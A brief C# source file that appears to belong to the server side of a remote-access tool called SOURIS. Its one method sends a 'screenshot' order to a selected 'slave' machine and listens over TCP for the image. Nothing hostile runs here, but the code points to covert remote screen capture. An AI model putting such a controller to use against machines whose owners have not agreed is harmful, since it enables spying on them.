using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Threading;

namespace SOURIS_Server.Slaves
{
    class SlaveFunc
    {
        public static void Screenshot()
        {
            try
            {
                int selected = MainWindow.main.listView1.SelectedIndex;
                Form.FormUpdate.ShowDialog("","");
                SlaveList.List[selected].NextOrder = "screenshot";
                Sockets.SocketServer.WaitForInteract = true;
                Sockets.TCPServer.ListenScreenshot();
            }
            catch
            {

            }
        }
    }
}
